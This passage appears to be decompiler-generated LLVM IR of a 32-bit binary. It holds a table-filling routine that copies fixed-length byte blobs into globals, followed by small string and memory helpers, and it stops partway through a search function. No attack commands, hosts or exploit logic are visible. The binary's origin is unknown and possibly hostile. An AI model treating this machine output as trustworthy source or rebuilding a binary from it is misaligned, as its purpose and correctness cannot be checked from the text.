  %v0_1000a818 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a818, i32* @global_var_1001ed0c.398, align 4
  store i32 268478496, i32* @lr, align 4
  %v0_1000a81c = call i32 @function_1000c3f0()
  store i32 %v0_1000a81c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a834.400 to i32), i32* @lr, align 4
  %v3_1000a830 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e2cc.399 to i32), i32 12, i32 12)
  store i32 23, i32* @r3, align 4
  %v0_1000a838 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a838, i32* @global_var_1001ed14.401, align 4
  %v0_1000a83c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000a83c = trunc i32 %v0_1000a83c to i16
  store i16 %v1_1000a83c, i16* bitcast (i32* @global_var_1001ed18.402 to i16*), align 4
  store i32 268478532, i32* @lr, align 4
  %v0_1000a840 = call i32 @function_1000c3f0()
  store i32 %v0_1000a840, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a858.404 to i32), i32* @lr, align 4
  %v3_1000a854 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e2dc.403 to i32), i32 23, i32 23)
  store i32 83, i32* @r3, align 4
  store i16 23, i16* bitcast (i32* @global_var_1001ed20.405 to i16*), align 4
  %v0_1000a864 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a864, i32* @global_var_1001ed1c.406, align 4
  store i32 268478572, i32* @lr, align 4
  %v0_1000a868 = call i32 @function_1000c3f0()
  store i32 %v0_1000a868, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a880.408 to i32), i32* @lr, align 4
  %v3_1000a87c = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e2f4.407 to i32), i32 83, i32 83)
  store i32 32, i32* @r3, align 4
  store i16 83, i16* bitcast (i32* @global_var_1001ed28.409 to i16*), align 4
  %v0_1000a88c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a88c, i32* @global_var_1001ed24.410, align 4
  store i32 268478612, i32* @lr, align 4
  %v0_1000a890 = call i32 @function_1000c3f0()
  store i32 %v0_1000a890, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a8a8.412 to i32), i32* @lr, align 4
  %v3_1000a8a4 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e348.411 to i32), i32 32, i32 32)
  store i32 48, i32* @r3, align 4
  store i16 32, i16* bitcast (i32* @global_var_1001ed30.413 to i16*), align 4
  %v0_1000a8b4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a8b4, i32* @global_var_1001ed2c.414, align 4
  store i32 268478652, i32* @lr, align 4
  %v0_1000a8b8 = call i32 @function_1000c3f0()
  store i32 %v0_1000a8b8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a8d0.416 to i32), i32* @lr, align 4
  %v3_1000a8cc = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e36c.415 to i32), i32 48, i32 48)
  store i32 12, i32* @r3, align 4
  store i16 48, i16* bitcast (i32* @global_var_1001ed38.417 to i16*), align 4
  %v0_1000a8dc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a8dc, i32* @global_var_1001ed34.418, align 4
  store i32 268478692, i32* @lr, align 4
  %v0_1000a8e0 = call i32 @function_1000c3f0()
  store i32 %v0_1000a8e0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a8f8.420 to i32), i32* @lr, align 4
  %v3_1000a8f4 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e3a0.419 to i32), i32 12, i32 12)
  store i32 9, i32* @r3, align 4
  %v0_1000a8fc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a8fc, i32* @global_var_1001ed3c.421, align 4
  %v0_1000a900 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000a900 = trunc i32 %v0_1000a900 to i16
  store i16 %v1_1000a900, i16* bitcast (i32* @global_var_1001ed40.422 to i16*), align 4
  store i32 268478728, i32* @lr, align 4
  %v0_1000a904 = call i32 @function_1000c3f0()
  store i32 %v0_1000a904, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a91c.424 to i32), i32* @lr, align 4
  %v3_1000a918 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e3b0.423 to i32), i32 9, i32 9)
  store i32 10, i32* @r3, align 4
  %v0_1000a920 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a920, i32* @global_var_1001ed44.425, align 4
  %v0_1000a924 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000a924 = trunc i32 %v0_1000a924 to i16
  store i16 %v1_1000a924, i16* bitcast (i32* @global_var_1001ed48.426 to i16*), align 4
  store i32 268478764, i32* @lr, align 4
  %v0_1000a928 = call i32 @function_1000c3f0()
  store i32 %v0_1000a928, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a940.428 to i32), i32* @lr, align 4
  %v3_1000a93c = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e3bc.427 to i32), i32 10, i32 10)
  store i32 12, i32* @r3, align 4
  %v0_1000a944 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a944, i32* @global_var_1001ed4c.429, align 4
  store i32 111, i32* %r27.global-to-local, align 4
  %v0_1000a94c = load i32, i32* %r26.global-to-local, align 4
  %v1_1000a94c = trunc i32 %v0_1000a94c to i16
  store i16 %v1_1000a94c, i16* bitcast (i32* @global_var_1001ed50.430 to i16*), align 4
  store i32 268478804, i32* @lr, align 4
  %v0_1000a950 = call i32 @function_1000c3f0()
  store i32 %v0_1000a950, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a968.432 to i32), i32* @lr, align 4
  %v3_1000a964 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e3c8.431 to i32), i32 12, i32 12)
  store i32 16, i32* @r3, align 4
  %v0_1000a96c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a96c, i32* @global_var_1001ed54.433, align 4
  %v0_1000a970 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000a970 = trunc i32 %v0_1000a970 to i16
  store i16 %v1_1000a970, i16* bitcast (i32* @global_var_1001ed58.434 to i16*), align 4
  store i32 268478840, i32* @lr, align 4
  %v0_1000a974 = call i32 @function_1000c3f0()
  store i32 %v0_1000a974, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a98c.436 to i32), i32* @lr, align 4
  %v3_1000a988 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e3d8.435 to i32), i32 16, i32 16)
  store i32 19, i32* @r3, align 4
  %v0_1000a990 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a990, i32* @global_var_1001ed5c.437, align 4
  %v0_1000a994 = load i32, i32* %r22.global-to-local, align 4
  %v1_1000a994 = trunc i32 %v0_1000a994 to i16
  store i16 %v1_1000a994, i16* bitcast (i32* @global_var_1001ed60.438 to i16*), align 4
  store i32 268478876, i32* @lr, align 4
  %v0_1000a998 = call i32 @function_1000c3f0()
  store i32 %v0_1000a998, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a9b0.440 to i32), i32* @lr, align 4
  %v3_1000a9ac = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e3ec.439 to i32), i32 19, i32 19)
  store i32 8, i32* @r3, align 4
  %v0_1000a9b4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a9b4, i32* @global_var_1001ed64.441, align 4
  %v0_1000a9b8 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000a9b8 = trunc i32 %v0_1000a9b8 to i16
  store i16 %v1_1000a9b8, i16* bitcast (i32* @global_var_1001ed68.442 to i16*), align 4
  store i32 268478912, i32* @lr, align 4
  %v0_1000a9bc = call i32 @function_1000c3f0()
  store i32 %v0_1000a9bc, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a9d4.444 to i32), i32* @lr, align 4
  %v4_1000a9d0 = call i32 @function_1000abe8(i32 ptrtoint ([9 x i8]* @global_var_1000e400.443 to i32), i32 8, i32 8)
  store i32 11, i32* @r3, align 4
  %v0_1000a9d8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a9d8, i32* @global_var_1001ed6c.445, align 4
  %v0_1000a9dc = load i32, i32* %r24.global-to-local, align 4
  %v1_1000a9dc = trunc i32 %v0_1000a9dc to i16
  store i16 %v1_1000a9dc, i16* bitcast (i32* @global_var_1001ed70.446 to i16*), align 4
  store i32 268478948, i32* @lr, align 4
  %v0_1000a9e0 = call i32 @function_1000c3f0()
  store i32 %v0_1000a9e0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a9f8.448 to i32), i32* @lr, align 4
  %v3_1000a9f4 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e2e8.447 to i32), i32 11, i32 11)
  store i32 12, i32* @r3, align 4
  %v0_1000a9fc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a9fc, i32* @global_var_1001ed74.449, align 4
  %v0_1000aa00 = load i32, i32* %r23.global-to-local, align 4
  %v1_1000aa00 = trunc i32 %v0_1000aa00 to i16
  store i16 %v1_1000aa00, i16* bitcast (i32* @global_var_1001ed78.450 to i16*), align 4
  store i32 268478984, i32* @lr, align 4
  %v0_1000aa04 = call i32 @function_1000c3f0()
  store i32 %v0_1000aa04, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aa1c.452 to i32), i32* @lr, align 4
  %v3_1000aa18 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e40c.451 to i32), i32 12, i32 12)
  store i32 18, i32* @r3, align 4
  %v0_1000aa20 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000aa20, i32* @global_var_1001ed7c.453, align 4
  %v0_1000aa24 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000aa24 = trunc i32 %v0_1000aa24 to i16
  store i16 %v1_1000aa24, i16* bitcast (i32* @global_var_1001ed80.454 to i16*), align 4
  store i32 268479020, i32* @lr, align 4
  %v0_1000aa28 = call i32 @function_1000c3f0()
  store i32 %v0_1000aa28, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000aa40.456 to i32), i32* @lr, align 4
  %v3_1000aa3c = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e41c.455 to i32), i32 18, i32 18)
  store i32 25, i32* @r3, align 4
  store i16 18, i16* bitcast (i32* @global_var_1001ed88.457 to i16*), align 4
  %v0_1000aa4c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000aa4c, i32* @global_var_1001ed84.458, align 4
  store i32 268479060, i32* @lr, align 4
  %v0_1000aa50 = call i32 @function_1000c3f0()
  store i32 %v0_1000aa50, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000aa68.460 to i32), i32* @lr, align 4
  %v3_1000aa64 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e430.459 to i32), i32 25, i32 25)
  store i32 111, i32* @r3, align 4
  store i16 25, i16* bitcast (i32* @global_var_1001ed90.461 to i16*), align 4
  %v0_1000aa74 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000aa74, i32* @global_var_1001ed8c.462, align 4
  store i32 268479100, i32* @lr, align 4
  %v0_1000aa78 = call i32 @function_1000c3f0()
  store i32 %v0_1000aa78, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aa90.464 to i32), i32* @lr, align 4
  %v3_1000aa8c = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e44c.463 to i32), i32 111, i32 111)
  store i32 111, i32* @r3, align 4
  %v0_1000aa94 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000aa94, i32* @global_var_1001ed94.465, align 4
  %v0_1000aa98 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000aa98 = trunc i32 %v0_1000aa98 to i16
  store i16 %v1_1000aa98, i16* bitcast (i32* @global_var_1001ed98.466 to i16*), align 4
  store i32 268479136, i32* @lr, align 4
  %v0_1000aa9c = call i32 @function_1000c3f0()
  store i32 %v0_1000aa9c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aab4.468 to i32), i32* @lr, align 4
  %v3_1000aab0 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e4bc.467 to i32), i32 111, i32 111)
  store i32 110, i32* @r3, align 4
  %v0_1000aab8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000aab8, i32* @global_var_1001ed9c.469, align 4
  %v0_1000aabc = load i32, i32* %r27.global-to-local, align 4
  %v1_1000aabc = trunc i32 %v0_1000aabc to i16
  store i16 %v1_1000aabc, i16* bitcast (i32* @global_var_1001eda0.470 to i16*), align 4
  store i32 268479172, i32* @lr, align 4
  %v0_1000aac0 = call i32 @function_1000c3f0()
  store i32 %v0_1000aac0, i32* %r28.global-to-local, align 4
  store i32 110, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aadc.472 to i32), i32* @lr, align 4
  %v3_1000aad8 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e52c.471 to i32), i32 110, i32 110)
  store i32 110, i32* @r3, align 4
  %v0_1000aae0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000aae0, i32* @global_var_1001eda4.473, align 4
  store i16 110, i16* bitcast (i32* @global_var_1001eda8.474 to i16*), align 4
  store i32 268479212, i32* @lr, align 4
  %v0_1000aae8 = call i32 @function_1000c3f0()
  store i32 %v0_1000aae8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ab00.476 to i32), i32* @lr, align 4
  %v3_1000aafc = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e59c.475 to i32), i32 110, i32 110)
  store i32 117, i32* @r3, align 4
  %v0_1000ab04 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000ab04, i32* @global_var_1001edac.477, align 4
  %v0_1000ab08 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ab08 = trunc i32 %v0_1000ab08 to i16
  store i16 %v1_1000ab08, i16* bitcast (i32* @global_var_1001edb0.478 to i16*), align 4
  store i32 268479248, i32* @lr, align 4
  %v0_1000ab0c = call i32 @function_1000c3f0()
  store i32 %v0_1000ab0c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000ab24.480 to i32), i32* @lr, align 4
  %v3_1000ab20 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e60c.479 to i32), i32 117, i32 117)
  store i16 117, i16* bitcast (i32* @global_var_1001edb8.481 to i16*), align 4
  %v0_1000ab30 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000ab30, i32* @global_var_1001edb4.482, align 4
  store i32 %v0_1000a384, i32* %r28.global-to-local, align 4
  ret i32 %v3_1000ab20

; uselistorder directives
  uselistorder i32 110, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 111, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i16 23, { 2, 1, 0 }
  uselistorder i32 21, { 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 33, { 0, 1, 5, 8, 9, 7, 6, 2, 10, 3, 11, 4, 12 }
  uselistorder i32 (i32, i32, i32)* @function_1000abe8, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 6, 5, 9, 8, 7, 3, 2, 1, 0, 4 }
}

define i32 @function_1000ab64(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000ab64:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000ab64 = load i8, i8* %arg1, align 1
  %v3_1000ab70 = icmp eq i8 %v3_1000ab64, 0
  %v0_1000ab74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ab70, i32 %v0_1000ab74)
  br label %dec_label_pc_1000ab78

dec_label_pc_1000ab78:                            ; preds = %dec_label_pc_1000ab78, %dec_label_pc_1000ab64
  %v0_1000ab78 = phi i32 [ %v1_1000ab78, %dec_label_pc_1000ab78 ], [ 0, %dec_label_pc_1000ab64 ]
  %v1_1000ab78 = add i32 %v0_1000ab78, 1
  %v2_1000ab7c = add i32 %v1_1000ab78, %tmp
  %v3_1000ab7c = inttoptr i32 %v2_1000ab7c to i8*
  %v4_1000ab7c = load i8, i8* %v3_1000ab7c, align 1
  %v3_1000ab80 = icmp eq i8 %v4_1000ab7c, 0
  br i1 %v3_1000ab80, label %dec_label_pc_1000ab88, label %dec_label_pc_1000ab78

dec_label_pc_1000ab88:                            ; preds = %dec_label_pc_1000ab78
  ret i32 %v1_1000ab78
}

define i32 @function_1000ab8c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ab8c:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000ab8c = load i8, i8* %arg1, align 1
  %v3_1000ab90 = icmp eq i8 %v2_1000ab8c, 0
  br i1 %v3_1000ab90, label %dec_label_pc_1000abdc, label %dec_label_pc_1000ab98

dec_label_pc_1000ab98:                            ; preds = %dec_label_pc_1000ab8c
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ab9c

dec_label_pc_1000ab9c:                            ; preds = %dec_label_pc_1000ab9c, %dec_label_pc_1000ab98
  %v0_1000ab9c = phi i32 [ %v1_1000ab9c, %dec_label_pc_1000ab9c ], [ 0, %dec_label_pc_1000ab98 ]
  %v1_1000ab9c = add i32 %v0_1000ab9c, 1
  store i32 %v1_1000ab9c, i32* %r9.global-to-local, align 4
  %v2_1000aba0 = add i32 %v1_1000ab9c, %tmp
  %v3_1000aba0 = inttoptr i32 %v2_1000aba0 to i8*
  %v4_1000aba0 = load i8, i8* %v3_1000aba0, align 1
  %v3_1000aba4 = icmp eq i8 %v4_1000aba0, 0
  br i1 %v3_1000aba4, label %dec_label_pc_1000abac, label %dec_label_pc_1000ab9c

dec_label_pc_1000abac:                            ; preds = %dec_label_pc_1000ab9c
  %v3_1000abac = icmp eq i32 %v1_1000ab9c, -1
  br i1 %v3_1000abac, label %dec_label_pc_1000abd4, label %dec_label_pc_1000abb4

dec_label_pc_1000abb4:                            ; preds = %dec_label_pc_1000abac
  %phitmp = add i32 %v0_1000ab9c, 2
  br label %dec_label_pc_1000abb8

dec_label_pc_1000abb8:                            ; preds = %dec_label_pc_1000abdc, %dec_label_pc_1000abb4
  %v0_1000abb8 = phi i32 [ 1, %dec_label_pc_1000abdc ], [ %phitmp, %dec_label_pc_1000abb4 ]
  store i32 %v0_1000abb8, i32* %ctr.global-to-local, align 4
  %v2_1000abc8.pre = load i32, i32* @r3, align 4
  %v2_1000abc08 = load i8, i8* %arg1, align 1
  %v1_1000abc410 = add i32 %tmp, 1
  store i32 %v1_1000abc410, i32* %r4.global-to-local, align 4
  %v3_1000abc811 = inttoptr i32 %v2_1000abc8.pre to i8*
  store i8 %v2_1000abc08, i8* %v3_1000abc811, align 1
  %v0_1000abcc12 = load i32, i32* @r3, align 4
  %v1_1000abcc13 = add i32 %v0_1000abcc12, 1
  store i32 %v1_1000abcc13, i32* %r3.global-to-local, align 4
  %v0_1000abd014 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000abd015 = add i32 %v0_1000abd014, -1
  store i32 %v1_1000abd015, i32* %ctr.global-to-local, align 4
  %v2_1000abd016 = icmp eq i32 %v1_1000abd015, 0
  br i1 %v2_1000abd016, label %dec_label_pc_1000abd4.loopexit, label %dec_label_pc_1000abc0.dec_label_pc_1000abc0_crit_edge

dec_label_pc_1000abc0.dec_label_pc_1000abc0_crit_edge: ; preds = %dec_label_pc_1000abb8, %dec_label_pc_1000abc0.dec_label_pc_1000abc0_crit_edge
  %v1_1000abcc17 = phi i32 [ %v1_1000abcc, %dec_label_pc_1000abc0.dec_label_pc_1000abc0_crit_edge ], [ %v1_1000abcc13, %dec_label_pc_1000abb8 ]
  %v0_1000abc0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000abc0 = inttoptr i32 %v0_1000abc0.pre to i8*
  %v2_1000abc0 = load i8, i8* %v1_1000abc0, align 1
  %v1_1000abc4 = add i32 %v0_1000abc0.pre, 1
  store i32 %v1_1000abc4, i32* %r4.global-to-local, align 4
  %v3_1000abc8 = inttoptr i32 %v1_1000abcc17 to i8*
  store i8 %v2_1000abc0, i8* %v3_1000abc8, align 1
  %v0_1000abcc = load i32, i32* %r3.global-to-local, align 4
  %v1_1000abcc = add i32 %v0_1000abcc, 1
  store i32 %v1_1000abcc, i32* %r3.global-to-local, align 4
  %v0_1000abd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000abd0 = add i32 %v0_1000abd0, -1
  store i32 %v1_1000abd0, i32* %ctr.global-to-local, align 4
  %v2_1000abd0 = icmp eq i32 %v1_1000abd0, 0
  br i1 %v2_1000abd0, label %dec_label_pc_1000abd4.loopexit, label %dec_label_pc_1000abc0.dec_label_pc_1000abc0_crit_edge

dec_label_pc_1000abd4.loopexit:                   ; preds = %dec_label_pc_1000abc0.dec_label_pc_1000abc0_crit_edge, %dec_label_pc_1000abb8
  %v0_1000abd4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000abd4

dec_label_pc_1000abd4:                            ; preds = %dec_label_pc_1000abd4.loopexit, %dec_label_pc_1000abac
  %v0_1000abd4 = phi i32 [ %v0_1000abd4.pre, %dec_label_pc_1000abd4.loopexit ], [ -1, %dec_label_pc_1000abac ]
  store i32 %v0_1000abd4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000abd4

dec_label_pc_1000abdc:                            ; preds = %dec_label_pc_1000ab8c
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000abb8

; uselistorder directives
  uselistorder i32 %v0_1000abd4, { 1, 0 }
  uselistorder i32 %v1_1000abd0, { 1, 0 }
  uselistorder i32 %v1_1000abcc, { 1, 0 }
  uselistorder i32 %v1_1000ab9c, { 0, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000abc0.dec_label_pc_1000abc0_crit_edge, { 1, 0 }
}

define i32 @function_1000abe8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000abe8:
  %ctr.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000abe8 = icmp eq i32 %arg3, 0
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v0_1000abf0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000abe8, i32 %v0_1000abf0)
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000abf8

dec_label_pc_1000abf8:                            ; preds = %dec_label_pc_1000abf8, %dec_label_pc_1000abe8
  %v0_1000abf8 = phi i32 [ %v1_1000ac00, %dec_label_pc_1000abf8 ], [ 0, %dec_label_pc_1000abe8 ]
  %v2_1000abf8 = add i32 %v0_1000abf8, %arg2
  %v3_1000abf8 = inttoptr i32 %v2_1000abf8 to i8*
  %v4_1000abf8 = load i8, i8* %v3_1000abf8, align 1
  %v4_1000abfc = add i32 %v0_1000abf8, %arg1
  %v5_1000abfc = inttoptr i32 %v4_1000abfc to i8*
  store i8 %v4_1000abf8, i8* %v5_1000abfc, align 1
  %v0_1000ac00 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ac00 = add i32 %v0_1000ac00, 1
  store i32 %v1_1000ac00, i32* %r9.global-to-local, align 4
  %v0_1000ac04 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ac04 = add i32 %v0_1000ac04, -1
  store i32 %v1_1000ac04, i32* %ctr.global-to-local, align 4
  %v2_1000ac04 = icmp eq i32 %v1_1000ac04, 0
  br i1 %v2_1000ac04, label %dec_label_pc_1000ac08, label %dec_label_pc_1000abf8

dec_label_pc_1000ac08:                            ; preds = %dec_label_pc_1000abf8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000ac04, { 1, 0 }
  uselistorder i32 %v1_1000ac00, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1000ac0c() local_unnamed_addr {
dec_label_pc_1000ac0c:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000ac0c = load i32, i32* @r4, align 4
  store i32 %v0_1000ac0c, i32* %r0.global-to-local, align 4
  %v3_1000ac0c = icmp eq i32 %v0_1000ac0c, 0
  store i32 %v0_1000ac0c, i32* %ctr.global-to-local, align 4
  %v0_1000ac14 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ac0c, i32 %v0_1000ac14)
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000ac203 = load i32, i32* @r3, align 4
  %v5_1000ac204 = inttoptr i32 %v2_1000ac203 to i8*
  store i8 0, i8* %v5_1000ac204, align 1
  %v0_1000ac245 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ac246 = add i32 %v0_1000ac245, 1
  store i32 %v1_1000ac246, i32* %r9.global-to-local, align 4
  %v0_1000ac287 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ac288 = add i32 %v0_1000ac287, -1
  store i32 %v1_1000ac288, i32* %ctr.global-to-local, align 4
  %v2_1000ac289 = icmp eq i32 %v1_1000ac288, 0
  br i1 %v2_1000ac289, label %dec_label_pc_1000ac2c, label %dec_label_pc_1000ac20.dec_label_pc_1000ac20_crit_edge

dec_label_pc_1000ac20.dec_label_pc_1000ac20_crit_edge: ; preds = %dec_label_pc_1000ac0c, %dec_label_pc_1000ac20.dec_label_pc_1000ac20_crit_edge
  %v1_1000ac2410 = phi i32 [ %v1_1000ac24, %dec_label_pc_1000ac20.dec_label_pc_1000ac20_crit_edge ], [ %v1_1000ac246, %dec_label_pc_1000ac0c ]
  %v0_1000ac20.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t = trunc i32 %v0_1000ac20.pre to i8
  %v2_1000ac20 = load i32, i32* @r3, align 4
  %v4_1000ac20 = add i32 %v2_1000ac20, %v1_1000ac2410
  %v5_1000ac20 = inttoptr i32 %v4_1000ac20 to i8*
  store i8 %extract.t, i8* %v5_1000ac20, align 1
  %v0_1000ac24 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ac24 = add i32 %v0_1000ac24, 1
  store i32 %v1_1000ac24, i32* %r9.global-to-local, align 4
  %v0_1000ac28 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ac28 = add i32 %v0_1000ac28, -1
  store i32 %v1_1000ac28, i32* %ctr.global-to-local, align 4
  %v2_1000ac28 = icmp eq i32 %v1_1000ac28, 0
  br i1 %v2_1000ac28, label %dec_label_pc_1000ac2c, label %dec_label_pc_1000ac20.dec_label_pc_1000ac20_crit_edge

dec_label_pc_1000ac2c:                            ; preds = %dec_label_pc_1000ac20.dec_label_pc_1000ac20_crit_edge, %dec_label_pc_1000ac0c
  %v0_1000ac2c = load i32, i32* @r3, align 4
  ret i32 %v0_1000ac2c

; uselistorder directives
  uselistorder i32 %v1_1000ac28, { 1, 0 }
  uselistorder i32 %v1_1000ac24, { 1, 0 }
  uselistorder i32 %v0_1000ac0c, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000ac20.dec_label_pc_1000ac20_crit_edge, { 1, 0 }
}

define i32 @function_1000ac30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000ac30:
  %v3_1000ac30 = icmp sgt i32 %arg4, %arg2
  br i1 %v3_1000ac30, label %dec_label_pc_1000ac3c, label %dec_label_pc_1000ac44

dec_label_pc_1000ac3c:                            ; preds = %dec_label_pc_1000ac60, %dec_label_pc_1000ac30, %dec_label_pc_1000ac44
  ret i32 -1

dec_label_pc_1000ac44:                            ; preds = %dec_label_pc_1000ac30
  %tmp = icmp slt i32 %arg2, 1
  br i1 %tmp, label %dec_label_pc_1000ac3c, label %dec_label_pc_1000ac4c

dec_label_pc_1000ac4c:                            ; preds = %dec_label_pc_1000ac44
  br label %dec_label_pc_1000ac68

dec_label_pc_1000ac5c:                            ; preds = %dec_label_pc_1000ac68
  br label %dec_label_pc_1000ac60

dec_label_pc_1000ac60:                            ; preds = %dec_label_pc_1000ac80, %dec_label_pc_1000ac5c
